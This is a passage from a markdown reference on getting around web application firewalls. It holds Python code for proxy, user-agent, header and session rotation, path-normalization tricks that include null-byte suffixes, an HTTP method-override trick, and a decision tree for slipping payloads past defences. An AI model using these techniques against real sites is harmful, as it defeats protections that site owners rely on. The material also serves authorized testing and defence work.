        for _ in range(len(self.proxies)):
            proxy = next(self.proxy_cycle)
            if proxy not in self.failed_proxies:
                return proxy
        # All proxies failed, reset
        self.failed_proxies.clear()
        return next(self.proxy_cycle)
    
    def report_success(self, proxy):
        self.proxy_stats[proxy]['success'] += 1
    
    def report_failure(self, proxy):
        self.proxy_stats[proxy]['fail'] += 1
        if self.proxy_stats[proxy]['fail'] > 5:
            self.failed_proxies.add(proxy)
    
    def get_random(self):
        """Get random working proxy"""
        available = [p for p in self.proxies if p not in self.failed_proxies]
        return random.choice(available) if available else self.get_next()

# === Proxy sources ===
# - Residential proxy services (Bright Data, Oxylabs, Smartproxy)
# - Data center proxy services
# - Tor network (slower but free)
# - Free proxy lists (less reliable)
# - AWS/GCP/Azure multi-region instances
```

### 6.3 User-Agent Rotation Pools

```python
import random

USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    # Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Firefox Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Safari Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Edge Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    # Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

def get_random_ua():
    return random.choice(USER_AGENTS)
```

### 6.4 Session Cookie Management

```python
import requests

class SessionPool:
    """Manage multiple sessions to distribute requests"""
    
    def __init__(self, size=5):
        self.sessions = [requests.Session() for _ in range(size)]
        self.current = 0
    
    def get_session(self):
        """Round-robin session selection"""
        session = self.sessions[self.current]
        self.current = (self.current + 1) % len(self.sessions)
        return session
    
    def refresh_session(self, index):
        """Create fresh session"""
        self.sessions[index] = requests.Session()
    
    def rotate_all(self):
        """Refresh all sessions"""
        self.sessions = [requests.Session() for _ in range(len(self.sessions))]

# === Cookie jar management ===
def load_cookies(session, cookie_file):
    """Load cookies from file into session"""
    with open(cookie_file) as f:
        cookies = json.load(f)
        for cookie in cookies:
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=cookie.get('domain', ''),
                path=cookie.get('path', '/')
            )

def extract_cookies(session):
    """Extract cookies from session for storage"""
    return [
        {
            'name': c.name,
            'value': c.value,
            'domain': c.domain,
            'path': c.path
        }
        for c in session.cookies
    ]
```

### 6.5 Distributed Request Patterns

```python
import asyncio
import aiohttp
import random

async def distributed_request_pattern(urls, max_concurrent=5):
    """
    Distribute requests across multiple targets with staggered timing.
    Reduces per-endpoint request rate while maintaining overall throughput.
    """
    semaphore = asyncio.Semaphore(max_concurrent)
    results = []
    
    async def fetch(session, url, delay):
        await asyncio.sleep(delay)  # Stagger requests
        async with semaphore:
            try:
                async with session.get(url) as resp:
                    return {'url': url, 'status': resp.status}
            except Exception as e:
                return {'url': url, 'error': str(e)}
    
    async with aiohttp.ClientSession() as session:
        # Add random stagger to each request
        tasks = [
            fetch(session, url, random.uniform(0, 5))
            for url in urls
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    return results

# === Adaptive rate limiting ===
class AdaptiveRateLimiter:
    def __init__(self, initial_rate=10.0):
        self.rate = initial_rate  # requests per second
        self.success_count = 0
        self.rate_limited_count = 0
        self.min_rate = 0.1
        self.max_rate = 100.0
    
    def get_delay(self):
        return 1.0 / self.rate
    
    def report_success(self):
        self.success_count += 1
        # Gradually increase rate on success
        if self.success_count % 10 == 0:
            self.rate = min(self.rate * 1.1, self.max_rate)
    
    def report_rate_limited(self):
        self.rate_limited_count += 1
        # Decrease rate on rate limiting
        self.rate = max(self.rate * 0.5, self.min_rate)
        self.success_count = 0
    
    def report_error(self, status_code):
        if status_code == 429:
            self.report_rate_limited()
        elif status_code == 503:
            self.rate = max(self.rate * 0.7, self.min_rate)
        else:
            self.report_success()
```

### 6.6 Advanced Evasion Strategies

```python
# === Header randomization ===
def randomize_headers():
    """Generate randomized but realistic headers"""
    return {
        'User-Agent': get_random_ua(),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json, text/plain, */*',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        ]),
        'Accept-Language': random.choice([
            'en-US,en;q=0.5',
            'en-GB,en;q=0.5',
            'en-US,en;q=0.9',
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': random.choice(['0', '1']),
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': random.choice([
            'max-age=0',
            'no-cache',
            'no-store',
        ]),
    }

# === Request path normalization bypass ===
def normalize_bypass(path):
    """Try different path normalizations to bypass path-based rate limiting"""
    variations = [
        path,
        path + '/',           # Trailing slash
        path + '?',           # Empty query
        path + '?=',          # Empty param
        path + '&',           # Extra ampersand
        '/' + path,           # Double leading slash
        path.replace('/', '//'),  # Double slashes
        path + '%20',         # Trailing space (encoded)
        path + '%00',         # Null byte suffix
        path.upper(),         # Uppercase
        path.lower(),         # Lowercase
    ]
    return variations

# === HTTP/2 specific evasion ===
# Some WAFs don't properly handle HTTP/2 features:
# - Pseudo-headers (:method, :path, :authority)
# - Header compression (HPACK)
# - Stream multiplexing
# - Server Push (if enabled)

# === HTTP method override ===
def method_override_payload(method, url, headers, data):
    """Use X-HTTP-Method-Override to bypass method-based restrictions"""
    headers['X-HTTP-Method-Override'] = method
    return 'POST', url, headers, data  # Send as POST with override header
```

---

## Appendix: Quick Bypass Decision Tree

```
Payload blocked by WAF?
    |
    +-- YES --> Identify WAF type
    |   |
    |   +-- Signature-based
    |   |   +-- Try encoding (URL, HTML, Unicode)
    |   |   +-- Try case variation
    |   |   +-- Try whitespace substitution
    |   |   +-- Try keyword splitting/comments
    |   |
    |   +-- Behavior-based
    |   |   +-- Slow down requests
    |   |   +-- Rotate User-Agent
    |   |   +-- Rotate IP/proxy
    |   |   +-- Add legitimate-looking parameters
    |   |
    |   +-- Heuristic/ML-based
    |   |   +-- Break payload into chunks
    |   |   +-- Use indirect execution
    |   |   +-- Use DOM-based delivery
    |   |   +-- Use time-delay techniques
    |   |
    |   +-- Rate-limiting
    |       +-- Reduce request rate
    |       +-- Use proxy rotation
    |       +-- Distribute requests temporally
    |
    +-- NO --> Payload accepted but no execution?
        |
        +-- Check context (HTML, JS, URL, CSS)
        +-- Try different context-specific payloads
        +-- Check for CSP blocking execution
        +-- Check for output encoding
        +-- Try mutation-based bypass
```

---

## Appendix: Encoding Reference Table

| Character | URL Encode | HTML Entity | Unicode | JS Escape |
|-----------|-----------|-------------|---------|-----------|
| `<` | `%3C` | `&lt;` | `\u003C` | `\x3c` |
| `>` | `%3E` | `&gt;` | `\u003E` | `\x3e` |
| `"` | `%22` | `&quot;` | `\u0022` | `\x22` |
| `'` | `%27` | `&#x27;` | `\u0027` | `\x27` |
| `&` | `%26` | `&amp;` | `\u0026` | `\x26` |
| `(` | `%28` | `&#x28;` | `\u0028` | `\x28` |
| `)` | `%29` | `&#x29;` | `\u0029` | `\x29` |
| `{` | `%7B` | `&#x7B;` | `\u007B` | `\x7b` |
| `}` | `%7D` | `&#x7D;` | `\u007D` | `\x7d` |
| `/` | `%2F` | `&#x2F;` | `\u002F` | `\x2f` |
| `\` | `%5C` | `&#x5C;` | `\u005C` | `\x5c` |
| `;` | `%3B` | `&#x3B;` | `\u003B` | `\x3b` |
| ` ` | `%20` | `&#x20;` | `\u0020` | `\x20` |
| `=` | `%3D` | `&#x3D;` | `\u003D` | `\x3d` |
| `+` | `%2B` | `&#x2B;` | `\u002B` | `\x2b` |
| `#` | `%23` | `&#x23;` | `\u0023` | `\x23` |
| `@` | `%40` | `&#x40;` | `\u0040` | `\x40` |

---

*End of WAF & Defense Bypass Techniques Reference*
